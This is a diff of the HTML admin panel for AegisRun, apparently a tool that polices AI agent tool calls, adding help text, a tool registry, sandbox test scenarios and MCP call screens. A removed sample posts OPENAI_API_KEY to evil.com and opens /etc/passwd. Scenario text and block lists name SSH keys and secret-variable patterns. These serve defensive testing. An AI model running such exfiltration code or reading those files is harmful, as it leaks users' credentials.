@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AegisRun Admin Panel v0.9.2</title>
+<title>AegisRun Admin Panel v0.9.3</title>
 <style>
 :root{--bg:#0d1117;--card:#161b22;--text:#e6edf3;--dim:#8b949e;--border:#30363d;--accent:#58a6ff;--green:#3fb950;--red:#f85149;--orange:#d29922;--purple:#bc8cff}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);margin:0;padding:20px;max-width:1280px;margin:auto}
@@ -62,13 +62,63 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 .status-dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:6px}
 .status-dot.on{background:var(--green)}
 .status-dot.off{background:var(--red)}
+.tool-reg-card{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:8px}
+.tool-reg-header{display:flex;justify-content:space-between;align-items:center}
+.tool-reg-name{font-weight:600;color:var(--accent);font-size:14px}
+.tool-reg-meta{font-size:11px;color:var(--dim);margin-top:4px}
+.tool-reg-tags{margin-top:6px}
+.tool-reg-tags .tag{background:#1a2332;color:var(--accent);border:1px solid var(--border);cursor:default;font-size:11px}
+.tag-cloud{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
+.tag-cloud-item{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;background:#1a2332;color:var(--accent);border:1px solid var(--border);cursor:pointer;transition:all .15s}
+.tag-cloud-item:hover{background:var(--accent);color:white}
+.info-banner{background:#1a2332;border:1px solid var(--accent);border-radius:8px;padding:14px 16px;margin-bottom:12px;font-size:13px;line-height:1.7;color:var(--dim)}
+.info-banner strong{color:var(--accent);font-weight:600}
+.info-banner .info-icon{color:var(--accent);margin-right:6px;font-weight:700}
+.scenario-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.scenario-card{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:14px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.scenario-card:hover{border-color:var(--accent);transform:translateY(-1px)}
+.scenario-card.scanning{border-color:var(--orange);pointer-events:none}
+.scenario-card.scanning::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--orange);animation:scanPulse 1s ease-in-out infinite}
+@keyframes scanPulse{0%,100%{opacity:.3}50%{opacity:1}}
+.scenario-title{font-weight:600;font-size:13px;color:var(--text);margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.scenario-desc{font-size:12px;color:var(--dim);line-height:1.5}
+.scenario-badge{display:inline-block;padding:1px 6px;border-radius:4px;font-size:10px;font-weight:600;margin-left:auto}
+.scenario-badge.danger{background:#3b1a1a;color:var(--red);border:1px solid var(--red)}
+.scenario-badge.safe{background:#1a3b1a;color:var(--green);border:1px solid var(--green)}
+.scenario-badge.warn{background:#3b2e1a;color:var(--orange);border:1px solid var(--orange)}
+.result-summary{display:flex;gap:16px;padding:12px 16px;border-radius:8px;margin-bottom:10px;font-size:14px;font-weight:600}
+.result-summary.pass{background:#1a3b1a;border:1px solid var(--green)}
+.result-summary.fail{background:#3b1a1a;border:1px solid var(--red)}
+.result-summary .result-icon{font-size:20px;margin-right:4px}
+.step-guide{display:flex;gap:12px;margin-bottom:14px}
+.step-item{flex:1;text-align:center;padding:10px 8px;background:var(--bg);border:1px solid var(--border);border-radius:8px;position:relative}
+.step-num{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:var(--accent);color:white;font-size:12px;font-weight:700;margin-bottom:6px}
+.step-text{font-size:12px;color:var(--dim);line-height:1.5}
+.step-arrow{position:absolute;right:-10px;top:50%;transform:translateY(-50%);color:var(--border);font-size:16px;z-index:1}
+.mcp-tool-card{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:8px;cursor:pointer;transition:all .15s}
+.mcp-tool-card:hover{border-color:var(--accent)}
+.mcp-tool-card.selected{border-color:var(--accent);background:#1a2332}
+.mcp-tool-card .tool-name{font-weight:600;color:var(--accent);font-size:13px}
+.mcp-tool-card .tool-desc{font-size:12px;color:var(--dim);margin-top:4px;line-height:1.5}
+.mcp-tool-card .tool-category{display:inline-block;padding:1px 6px;border-radius:4px;font-size:10px;background:#1a2332;color:var(--purple);border:1px solid var(--purple);margin-top:4px}
+.quick-btn{display:inline-block;padding:4px 12px;margin:2px;border-radius:6px;font-size:12px;background:var(--bg);border:1px solid var(--border);color:var(--dim);cursor:pointer;transition:all .15s}
+.quick-btn:hover{border-color:var(--accent);color:var(--accent)}
+.paste-zone{border:2px dashed var(--border);border-radius:8px;padding:20px;text-align:center;color:var(--dim);font-size:13px;cursor:pointer;transition:all .2s;margin-bottom:10px}
+.paste-zone:hover,.paste-zone.active{border-color:var(--accent);color:var(--accent)}
+.mcp-tool-check{display:flex;align-items:flex-start;gap:10px}
+.mcp-tool-check input[type="checkbox"]{width:auto;margin:3px 0 0;flex-shrink:0;accent-color:var(--accent)}
+.mcp-tool-check .tool-card-body{flex:1;cursor:pointer}
+.batch-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--bg);border:1px solid var(--accent);border-radius:8px;margin-bottom:12px}
+.mode-indicator{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600;margin-left:8px}
+.mode-indicator.demo{background:#3b2e1a;color:var(--orange);border:1px solid var(--orange)}
+.mode-indicator.real{background:#1a3b1a;color:var(--green);border:1px solid var(--green)}
 </style>
 </head>
 <body>
 <header>
   <h1>AegisRun</h1>
   <span style="color:var(--dim);font-size:13px" data-i18n="header_subtitle">Admin Panel</span>
-  <span class="version-badge">v0.9.2</span>
+  <span class="version-badge">v0.9.3</span>
   <div class="lang-toggle">
     <button class="active" onclick="setLang('zh',this)">中文</button>
     <button onclick="setLang('en',this)">EN</button>
@@ -90,10 +140,14 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 
 <!-- ═══ Dashboard ═══ -->
 <main id="dashboard">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="dashboard_explain">AegisRun 安全面板，实时查看防御层状态、拦截统计和策略预设。切换预设可快速调整安全等级，各防御层可独立开关。</span>
+  </div>
   <div class="grid">
     <div class="card">
       <h3 data-i18n="defense_layers">Defense Layers</h3>
-      <div id="defense-toggles"></div>
+      <div id="defense-toggles"><span style="color:var(--dim);font-size:12px" data-i18n="loading">Loading...</span></div>
     </div>
     <div class="card">
       <h3 data-i18n="statistics">Statistics</h3>
@@ -115,8 +169,13 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 
 <!-- ═══ Domains ═══ -->
 <main id="domains" style="display:none">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="domain_explain">域名策略控制 AI Agent 可以访问哪些网络目标。黑名单中的域名将被拦截，白名单中的域名将被放行。支持精确匹配和通配符（如 <strong>evil.*</strong> 匹配所有 .evil 子域名）。</span>
+  </div>
   <div class="card">
     <h3 data-i18n="domain_blacklist">Domain Blacklist</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="domain_blacklist_hint">添加你希望拦截的域名，Agent 调用时如匹配黑名单将被拒绝。</div>
     <div id="domain-blacklist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-domain" placeholder="evil.com" onkeydown="if(event.key==='Enter')addItem('domain-bl')">
@@ -125,6 +184,7 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
   </div>
   <div class="card">
     <h3 data-i18n="domain_whitelist">Domain Whitelist</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="domain_whitelist_hint">添加你可信的目标域名，白名单优先于黑名单。</div>
     <div id="domain-whitelist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-allow" placeholder="safe.com" onkeydown="if(event.key==='Enter')addItem('domain-wl')">
@@ -135,8 +195,13 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 
 <!-- ═══ Paths ═══ -->
 <main id="paths" style="display:none">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="path_explain">路径策略控制 AI Agent 可以读写哪些文件。支持精确路径匹配和通配符前缀匹配（如 <strong>~/.ssh/*</strong> 匹配所有 SSH 配置文件和密钥）。</span>
+  </div>
   <div class="card">
     <h3 data-i18n="path_blacklist">Path Blacklist</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="path_blacklist_hint">添加你希望禁止访问的路径，支持通配符 <strong>*</strong>。示例：<code>/etc/passwd</code>、<code>~/.ssh/*</code>、<code>C:\Windows\*</code></div>
     <div id="path-blacklist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-path" placeholder="/etc/passwd" onkeydown="if(event.key==='Enter')addItem('path-bl')">
@@ -147,54 +212,122 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 
 <!-- ═══ Env ═══ -->
 <main id="env" style="display:none">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="env_explain">环境变量策略控制 AI Agent 可以读取哪些敏感变量。匹配规则：变量名中包含 <strong>KEY</strong>、<strong>SECRET</strong>、<strong>TOKEN</strong>、<strong>PASSWORD</strong> 等关键词的将被拦截。你也可以在此页面自定义敏感模式。</span>
+  </div>
   <div class="card">
     <h3 data-i18n="env_patterns">Sensitive Env Patterns</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="env_patterns_hint">添加自定义的敏感环境变量模式（如 <strong>*_KEY</strong>、<strong>*_SECRET</strong>），Agent 读取匹配的变量将被拦截。</div>
     <div id="env-patterns"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-env" placeholder="MY_API_KEY" onkeydown="if(event.key==='Enter')addItem('env-pattern')">
-      <button class="btn btn-danger" onclick="addItem('env-pattern')" data-i18n="btn_add">Add</button>
+      <button class="btn btn-danger" onclick="addItem('env-pattern')" data-i18n="btn_block">Block</button>
     </div>
   </div>
 </main>
 
 <!-- ═══ Tools ═══ -->
 <main id="tools" style="display:none">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="tool_explain">这里的「工具」是指 AI Agent 可以调用的<strong>外部能力插件</strong>（MCP 工具）。比如查天气、执行代码、搜索文件——每个工具都是一个独立的小程序。AegisRun 帮你管理这些工具：<strong>注册</strong>新工具、<strong>搜索</strong>已有工具、<strong>封禁</strong>危险工具，确保 Agent 只使用安全可信的工具。</span>
+  </div>
+  <!-- Example Tools -->
+  <div class="card">
+    <h3><span data-i18n="example_tools">示例工具</span> <span style="font-size:11px;color:var(--dim);font-weight:400" data-i18n="example_tools_hint">— 仅供参考，点击「注册」可一键添加</span></h3>
+    <div id="example-tools-list"></div>
+  </div>
+  <!-- Directory Scanner -->
+  <div class="card">
+    <h3 data-i18n="scan_dir">扫描目录注册工具</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="scan_dir_hint">指定一个目录路径，自动扫描其中的 .wasm 文件并批量注册为工具。</div>
+    <div style="display:flex;gap:8px">
+      <input id="scan-dir-path" placeholder="C:\tools\wasm  或  /home/user/tools" style="flex:1;margin:0">
+      <button class="btn btn-purple" onclick="scanDir()" data-i18n="btn_scan">扫描</button>
+    </div>
+    <div id="scan-dir-results" style="margin-top:10px"></div>
+    <div id="scan-dir-actions" style="display:none;margin-top:8px">
+      <button class="btn btn-green" onclick="batchRegisterScanned()" data-i18n="btn_batch_register">批量注册选中项</button>
+      <span id="scan-selected-count" style="font-size:12px;color:var(--dim);margin-left:8px"></span>
+    </div>
+  </div>
+  <div class="card">
+    <h3><span data-i18n="tool_registry">Tool Registry</span> <button onclick="fetchToolRegistry()" style="float:right;font-size:12px;padding:2px 8px;cursor:pointer;background:var(--accent);color:white;border:none;border-radius:4px" data-i18n="btn_refresh">Refresh</button></h3>
+    <div style="display:flex;gap:8px;margin-bottom:10px">
+      <input id="tool-search" placeholder="Search tools..." onkeydown="if(event.key==='Enter')searchTools()" style="flex:1;margin:0">
+      <button class="btn btn-primary" onclick="searchTools()" data-i18n="btn_search">Search</button>
+    </div>
+    <div id="tool-tag-cloud" class="tag-cloud"></div>
+    <div id="tool-registry-list" style="margin-top:12px;max-height:500px;overflow-y:auto"></div>
+  </div>
   <div class="card">
     <h3 data-i18n="tool_blacklist">Tool Blacklist</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="tool_blacklist_hint">封禁的工具将被完全禁止调用，即使已注册也无法运行。</div>
     <div id="tool-blacklist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-tool" placeholder="tool-id" onkeydown="if(event.key==='Enter')addItem('tool-bl')">
       <button class="btn btn-danger" onclick="addItem('tool-bl')" data-i18n="btn_block">Block</button>
     </div>
   </div>
+  <div class="card">
+    <h3 data-i18n="register_tool">Register Tool</h3>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+      <div><label style="font-size:12px;color:var(--dim)">Tool ID</label><input id="reg-tool-id" placeholder="my-tool"></div>
+      <div><label style="font-size:12px;color:var(--dim)">Publisher</label><input id="reg-publisher" placeholder="@publisher"></div>
+      <div><label style="font-size:12px;color:var(--dim)">Version</label><input id="reg-version" placeholder="1.0.0" value="1.0.0"></div>
+      <div><label style="font-size:12px;color:var(--dim)">WASM Path</label><input id="reg-wasm-path" placeholder="tool.wasm"></div>
+    </div>
+    <div style="margin-top:8px"><label style="font-size:12px;color:var(--dim)">Description</label><input id="reg-description" placeholder="Tool description"></div>
+    <div style="margin-top:8px"><label style="font-size:12px;color:var(--dim)">Tags (comma separated)</label><input id="reg-tags" placeholder="net, security"></div>
+    <button class="btn btn-green" onclick="registerTool()" style="margin-top:10px" data-i18n="btn_register">Register</button>
+    <div id="reg-result" style="margin-top:8px;font-size:12px"></div>
+  </div>
 </main>
 
 <!-- ═══ Audit ═══ -->
 <main id="audit" style="display:none">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="audit_explain">审计日志记录了 Agent 每一次调用的检测结果，包括域名检查、路径检查、环境变量检查、代码扫描和沙箱执行。每条记录包含时间、工具、操作类型和最终决策。</span>
+  </div>
   <div class="card">
-    <h3><span data-i18n="audit_log">Audit Log</span> <button onclick="fetch('/api/clear-audit',{method:'POST'}).then(()=>fetchAudit())" style="float:right;font-size:12px;padding:2px 8px;cursor:pointer;background:var(--red);color:white;border:none;border-radius:4px" data-i18n="btn_clear">Clear</button></h3>
+    <h3><span data-i18n="audit_log">Audit Log</span> <button onclick="if(confirm(t('audit_clear_confirm'))){fetch('/api/clear-audit',{method:'POST'}).then(()=>fetchAudit())}" style="float:right;font-size:12px;padding:2px 8px;cursor:pointer;background:var(--red);color:white;border:none;border-radius:4px" data-i18n="btn_clear">Clear</button></h3>
     <div id="audit-log" style="max-height:600px;overflow-y:auto"></div>
   </div>
 </main>
 
 <!-- ═══ Sandbox ═══ -->
 <main id="sandbox" style="display:none">
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="sandbox_explain">不确定一段代码是否安全？点击下方场景卡片一键检测，或粘贴你自己的代码。AegisRun 会自动分析其中的安全风险并给出结果。</span>
+  </div>
   <div class="card">
-    <h3 data-i18n="security_check">Security Check</h3>
-    <div class="seg-ctrl">
-      <button class="active" onclick="setSandboxMode('static',this)" data-i18n="mode_static">Static Scan</button>
-      <button onclick="setSandboxMode('runtime',this)" data-i18n="mode_runtime">Runtime Sandbox</button>
+    <div class="seg-ctrl" id="sandbox-mode">
+      <button class="active" onclick="switchSandboxMode('static',this)" data-i18n="mode_static" data-mode="static">静态扫描</button>
+      <button onclick="switchSandboxMode('runtime',this)" data-i18n="mode_runtime" data-mode="runtime">运行时沙箱</button>
     </div>
-    <div id="sandbox-mode-hint" style="font-size:12px;color:var(--dim);margin-bottom:8px;line-height:1.6">
+    <div style="font-size:12px;color:var(--dim);margin-bottom:10px;padding:8px 12px;background:var(--bg);border-radius:6px;border:1px solid var(--border)">
+      <span id="sandbox-mode-hint" data-i18n="hint_static">静态分析：扫描源码中的恶意模式（环境变量窃取、数据外泄、Shell 注入等）</span>
     </div>
-    <textarea id="sandbox-code" rows="10" style="width:100%">import os
-key = os.environ.get("OPENAI_API_KEY")
-import requests
-requests.post("https://evil.com/steal", data={"key": key})
-open("/etc/passwd")</textarea>
-    <div style="display:flex;gap:8px;margin-top:8px">
+    <h3 data-i18n="quick_scan">一键检测</h3>
+    <div class="seg-ctrl" id="sandbox-input-mode" style="margin-bottom:10px">
+      <button class="active" onclick="switchInputMode('paste',this)" data-i18n="input_paste_code" data-mode="paste">粘贴代码</button>
+      <button onclick="switchInputMode('file',this)" data-i18n="input_file_path" data-mode="file">文件路径</button>
+    </div>
+    <div class="scenario-grid" id="scenario-grid"></div>
+    <div class="paste-zone" id="paste-zone" onclick="showCodeInput()" data-i18n="paste_hint">
+      点击此处粘贴你的代码进行检测...
+    </div>
+    <textarea id="sandbox-code" rows="5" style="width:100%;display:none" placeholder="粘贴或输入代码..." oninput="updatePasteZone()"></textarea>
+    <div style="display:flex;gap:8px;margin-top:8px" id="file-path-row">
+      <input id="sandbox-file-path" placeholder="输入文件路径，如 /path/to/test.py" style="flex:1;margin:0;font-family:monospace;font-size:12px;display:none" onkeydown="if(event.key==='Enter')runCheck()">
+      <button class="btn" style="background:var(--card);color:var(--dim);border:1px solid var(--border);font-size:12px;white-space:nowrap;display:none" onclick="clearFilePath()" id="btn-clear-path" data-i18n="btn_clear_file">清除路径</button>
+    </div>
+    <div style="display:flex;gap:8px;margin-top:4px">
       <button class="btn btn-primary" onclick="runCheck()" data-i18n="btn_run">Run</button>
-      <button class="btn" style="background:var(--card);color:var(--dim);border:1px solid var(--border)" onclick="document.getElementById('sandbox-code').value=''" data-i18n="btn_clear2">Clear</button>
+      <button class="btn" style="background:var(--card);color:var(--dim);border:1px solid var(--border)" onclick="clearSandbox()" data-i18n="btn_clear2">Clear</button>
     </div>
     <div id="sandbox-result" style="margin-top:12px"></div>
   </div>
@@ -202,33 +335,81 @@ open("/etc/passwd")</textarea>
 
 <!-- ═══ MCP Agent ═══ -->
 <main id="mcp" style="display:none">
-  <div class="grid">
-    <div class="card">
-      <h3 data-i18n="mcp_endpoint">MCP Endpoint</h3>
-      <div id="mcp-desc" style="font-size:12px;color:var(--dim);line-height:1.7;margin-bottom:8px"></div>
-      <pre>{
+  <div class="info-banner">
+    <span class="info-icon">i</span>
+    <span data-i18n="mcp_explain"><strong>MCP（Model Context Protocol）</strong>是 AI 客户端（如 Claude Desktop、Codex）与安全服务之间的标准通信协议。把下面的地址配置到你的 AI 客户端中，Agent 就能实时调用 AegisRun 进行策略检查、代码扫描和沙箱检测。</span>
+  </div>
+  <div class="card">
+    <h3 data-i18n="mcp_endpoint">MCP Endpoint</h3>
+    <div style="font-size:12px;color:var(--dim);margin-bottom:8px" data-i18n="mcp_endpoint_hint">将以下 JSON 添加到你的 AI 客户端配置文件中即可连接：</div>
+    <pre>{
   "mcpServers": {
     "aegisrun": {
       "url": "http://localhost:9090/mcp"
     }
   }
 }</pre>
-      <button class="btn btn-purple" onclick="fetchMcpTools()" style="margin-top:8px" data-i18n="btn_refresh_tools">Refresh Tools</button>
+  </div>
+  <div class="card">
+    <h3><span data-i18n="available_tools">Available Tools</span> <span id="mcp-tool-count" style="font-size:12px;color:var(--dim);font-weight:400;margin-left:8px"></span></h3>
+    <div id="mcp-select-all-wrap" style="display:none;margin-bottom:8px">
+      <label style="font-size:12px;color:var(--dim);cursor:pointer;display:flex;align-items:center;gap:6px">
+        <input type="checkbox" id="mcp-select-all" onchange="toggleSelectAllMcp()" style="width:auto;margin:0;accent-color:var(--accent)">
+        <span data-i18n="mcp_select_all">全选</span>
+      </label>
     </div>
-    <div class="card">
-      <h3 data-i18n="available_tools">Available Tools</h3>
-      <div id="mcp-tools" style="font-size:13px;color:var(--dim)" data-i18n="loading">Loading...</div>
+    <div id="mcp-tools" style="font-size:13px;color:var(--dim)" data-i18n="loading">Loading...</div>
+    <div id="mcp-batch-bar" class="batch-bar" style="display:none">
+      <span id="mcp-selected-count" style="font-size:13px;color:var(--accent);font-weight:600"></span>
+      <button class="btn btn-primary" onclick="batchCallMcpTools()" data-i18n="mcp_batch_call">批量调用</button>
+      <button class="btn" style="background:var(--card);color:var(--dim);border:1px solid var(--border);font-size:12px" onclick="clearMcpSelection()" data-i18n="btn_clear2">清除</button>
     </div>
   </div>
   <div class="card">
-    <h3 data-i18n="interactive_call">Interactive Call</h3>
-    <div style="display:flex;gap:8px;margin-bottom:8px">
-      <select id="mcp-tool-select" onchange="onMcpToolChange()" style="flex:1"></select>
-      <button class="btn btn-primary" onclick="callMcpTool()" data-i18n="btn_call">Call</button>
+    <h3><span data-i18n="interactive_call">交互式调用</span>
+      <span id="mcp-mode-badge" class="mode-indicator demo" data-i18n="mcp_mode_demo">演示模式</span>
+    </h3>
+    <div style="margin-bottom:12px;padding:10px 14px;background:var(--bg);border-radius:8px;border:1px solid var(--border)">
+      <div style="display:flex;align-items:center;gap:10px">
+        <label class="toggle" style="flex-shrink:0">
+          <input type="checkbox" id="mcp-mode-toggle" onchange="toggleMcpMode()">
+          <span class="slider"></span>
+        </label>
+        <div>
+          <div style="font-size:13px;font-weight:600;color:var(--text)" id="mcp-mode-label" data-i18n="mcp_mode_demo">演示模式</div>
+          <div style="font-size:11px;color:var(--dim);margin-top:2px" id="mcp-mode-desc" data-i18n="mcp_mode_demo_desc">仅生成请求预览，不会真正发送到 MCP 端点。适合了解调用格式。</div>
+        </div>
+      </div>
     </div>
-    <textarea id="mcp-args" rows="6" style="width:100%">{
-  "domain": "evil.com"
-}</textarea>
+    <div class="step-guide">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-text" data-i18n="step1_text">从上方工具列表选择一个工具</div>
+        <span class="step-arrow">→</span>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-text" data-i18n="step2_text">参数已自动填好，也可修改</div>
+        <span class="step-arrow">→</span>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-text" data-i18n="step3_text">点击「调用」查看实时结果</div>
+      </div>
+    </div>
+    <div style="margin-bottom:10px">
+      <label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px" data-i18n="select_tool_label">选择工具：</label>
+      <select id="mcp-tool-select" onchange="onMcpToolChange()" style="width:100%;margin:0"></select>
+    </div>
+    <div id="mcp-tool-hint" style="font-size:12px;color:var(--dim);margin-bottom:8px;line-height:1.6;padding:8px 12px;background:var(--bg);border-radius:6px;border:1px solid var(--border)"></div>
+    <div style="margin-bottom:10px">
+      <label style="font-size:12px;color:var(--dim);display:block;margin-bottom:4px" data-i18n="args_label">参数（JSON 格式）：</label>
+      <textarea id="mcp-args" rows="5" style="width:100%;margin:0"></textarea>
+    </div>
+    <div style="display:flex;gap:8px">
+      <button class="btn btn-primary" onclick="callMcpTool()" data-i18n="btn_call">调用</button>
+      <div id="mcp-quick-btns"></div>
+    </div>
     <div id="mcp-call-result" style="margin-top:10px"></div>
   </div>
 </main>
@@ -242,9 +423,38 @@ const I18N = {
     defense_layers: '防御层状态', statistics: '实时统计', allowed: '放行', blocked: '拦截', preset: '预设模板',
     domain_blacklist: '域名黑名单', domain_whitelist: '域名白名单',
     path_blacklist: '路径黑名单', env_patterns: '敏感环境变量', tool_blacklist: '工具黑名单',
+    tool_blacklist_hint: '封禁的工具将被完全禁止调用，即使已注册也无法运行。',
     audit_log: '审计日志', btn_clear: '清空',
-    btn_block: '封禁', btn_allow: '放行', btn_add: '添加', btn_run: '运行', btn_clear2: '清除',
+    btn_block: '封禁', btn_allow: '放行', btn_add: '添加', btn_run: '检测', btn_clear2: '清除',
+    btn_clear_file: '清除路径',
+    input_paste_code: '粘贴代码', input_file_path: '文件路径',
+    dashboard_explain: 'AegisRun 安全面板，实时查看防御层状态、拦截统计和策略预设。切换预设可快速调整安全等级，各防御层可独立开关。',
+    domain_explain: '域名策略控制 AI Agent 可以访问哪些网络目标。黑名单中的域名将被拦截，白名单中的域名将被放行。支持精确匹配和通配符（如 <strong>evil.*</strong> 匹配所有 .evil 子域名）。',
+    domain_blacklist_hint: '添加你希望拦截的域名，Agent 调用时如匹配黑名单将被拒绝。',
+    domain_whitelist_hint: '添加你可信的目标域名，白名单优先于黑名单。',
+    domain_blacklist_empty: '暂无封禁的域名',
+    domain_whitelist_empty: '暂无放行的域名',
+    path_explain: '路径策略控制 AI Agent 可以读写哪些文件。支持精确路径匹配和通配符前缀匹配（如 <strong>~/.ssh/*</strong> 匹配所有 SSH 配置文件和密钥）。',
+    path_blacklist_hint: '添加你希望禁止访问的路径，支持通配符 <strong>*</strong>。示例：<code>/etc/passwd</code>、<code>~/.ssh/*</code>、<code>C:\\Windows\\*</code>',
+    path_blacklist_empty: '暂无封禁的路径',
+    env_explain: '环境变量策略控制 AI Agent 可以读取哪些敏感变量。匹配规则：变量名中包含 <strong>KEY</strong>、<strong>SECRET</strong>、<strong>TOKEN</strong>、<strong>PASSWORD</strong> 等关键词的将被拦截。你也可以在此页面自定义敏感模式。',
+    env_patterns_hint: '添加自定义的敏感环境变量模式（如 <strong>*_KEY</strong>、<strong>*_SECRET</strong>），Agent 读取匹配的变量将被拦截。',
+    env_patterns_empty: '暂无自定义敏感模式',
+    audit_explain: '审计日志记录了 Agent 每一次调用的检测结果，包括域名检查、路径检查、环境变量检查、代码扫描和沙箱执行。每条记录包含时间、工具、操作类型和最终决策。',
+    audit_empty: '暂无审计记录',
+    audit_clear_confirm: '确认清空所有审计日志？此操作不可恢复。',
     security_check: '安全检测',
+    tool_explain: '这里的「工具」是指 AI Agent 可以调用的<strong>外部能力插件</strong>（MCP 工具）。比如查天气、执行代码、搜索文件——每个工具都是一个独立的小程序。AegisRun 帮你管理这些工具：<strong>注册</strong>新工具、<strong>搜索</strong>已有工具、<strong>封禁</strong>危险工具，确保 Agent 只使用安全可信的工具。',
+    sandbox_explain: '不确定一段代码是否安全？点击下方场景卡片一键检测，或粘贴你自己的代码。AegisRun 会自动分析其中的安全风险并给出结果。',
+    quick_scan: '一键检测',
+    paste_hint: '点击此处粘贴你的代码进行检测...',
+    mcp_explain: '<strong>MCP（Model Context Protocol）</strong>是 AI 客户端（如 Claude Desktop、Codex）与安全服务之间的标准通信协议。把下面的地址配置到你的 AI 客户端中，Agent 就能实时调用 AegisRun 进行策略检查、代码扫描和沙箱检测。',
+    mcp_endpoint_hint: '将以下 JSON 添加到你的 AI 客户端配置文件中即可连接：',
+    step1_text: '从上方工具列表选择一个工具',
+    step2_text: '参数已自动填好，也可修改',
+    step3_text: '点击「调用」查看实时结果',
+    select_tool_label: '选择工具：',
+    args_label: '参数（JSON 格式）：',
     mode_static: '静态扫描', mode_runtime: '运行时沙箱',
     hint_static: '静态分析：扫描源码中的恶意模式（环境变量窃取、数据外泄、Shell 注入等）',
     hint_runtime: '运行时沙箱：通过 Python audit hook 拦截 open/env/network/subprocess 等操作',
@@ -252,22 +462,81 @@ const I18N = {
     mcp_desc: 'Agent 通过 MCP 实时调用 AegisRun 进行策略检查、代码扫描和运行时沙箱检测。',
     available_tools: '可用工具', loading: '加载中...', btn_refresh_tools: '刷新工具',
     interactive_call: '交互式调用', btn_call: '调用',
-    finding_clean: 'CLEAN - 未发现违规', finding_blocked: 'BLOCKED', finding_flagged: 'FLAGGED',
+    finding_clean: '未发现安全问题', finding_blocked: '已拦截', finding_flagged: '需关注',
     checking: '检测中...', scan_failed: '请求失败',
     stat_static: '静态', stat_runtime: '运行时', stat_blocked_label: '拦截',
     layer_runtime: '运行时沙箱', layer_domain: '域名黑名单', layer_path_env: '路径+环境变量', layer_scanner: '扫描器', layer_wasm: 'Wasm 沙箱',
     mcp_no_tools: '无工具', mcp_unavailable: 'MCP 端点不可用',
     mcp_calling: '调用中...', mcp_bad_json: '参数 JSON 格式错误', mcp_call_failed: '调用失败',
+    tool_registry: '工具注册表', btn_refresh: '刷新', btn_search: '搜索',
+    register_tool: '注册工具', btn_register: '注册',
+    tool_count_label: '已注册', no_tools: '暂无注册工具',
+    tool_reg_success: '注册成功', tool_reg_failed: '注册失败',
+    tool_unreg_confirm: '确认卸载此工具？', tool_unreg_success: '已卸载',
+    tag_cloud_title: '标签浏览',
+    scenario_env_theft: '环境变量窃取',
+    scenario_env_theft_desc: '读取系统环境变量 OPENAI_API_KEY，通过 requests 外发到恶意域名 evil.com。触发检查：env(敏感环境变量) + host(恶意域名)',
+    scenario_data_leak: '敏感文件访问',
+    scenario_data_leak_desc: '直接读取 /etc/passwd（系统密码文件）和 ~/.ssh/id_rsa（SSH 私钥）。触发检查：path(系统敏感路径)',
+    scenario_dns_hijack: '内网探测',
+    scenario_dns_hijack_desc: '通过 socket 连接内网 IP：192.168.1.1(路由器)、10.0.0.1(内网)、127.0.0.1(本机)。触发检查：host(内网/保留地址)',
+    scenario_safe: '正常天气查询',
+    scenario_safe_desc: '调用公开天气 API wttr.in/Shenzhen，无敏感操作。预期结果：全部放行，0 项违规',
+    scenario_result_safe: '安全 — 全部放行',
+    scenario_result_blocked: '已拦截 — 发现 {n} 项违规',
+    cat_policy: '策略检查', cat_scan: '代码扫描', cat_sandbox: '沙箱执行', cat_tools: '工具管理',
+    example_tools: '示例工具', example_tools_hint: '— 仅供参考，点击「注册」可一键添加',
+    scan_dir: '扫描目录注册工具', scan_dir_hint: '指定一个目录路径，自动扫描其中的 .wasm 文件并批量注册为工具。',
